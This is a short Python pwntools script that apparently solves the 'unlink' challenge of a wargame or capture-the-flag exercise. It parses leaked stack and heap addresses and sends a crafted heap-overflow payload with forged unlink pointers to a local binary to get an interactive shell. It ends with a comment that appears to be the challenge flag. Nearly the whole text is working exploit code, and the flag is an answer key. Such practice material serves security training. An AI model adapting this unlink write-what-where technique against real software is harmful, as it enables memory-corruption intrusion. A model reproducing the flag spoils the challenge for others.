from pwn import *

r = process('/home/unlink/unlink')

shell = 0x80484eb
r.recvuntil('here is stack address leak: ')
stk = int(r.recv(10), 16)
r.recvuntil('here is heap address leak: ')
heap = int(r.recv(9), 16)
r.recv()

# start from A->buf to B->fd
offset = 16
payload = p32(shell) + 'A'*(offset - len(p32(shell))) + p32(heap+0xc) + p32(stk+0X10)
r.sendline(payload)

r.interactive()
# conditional_write_what_where_from_unl1nk_explo1t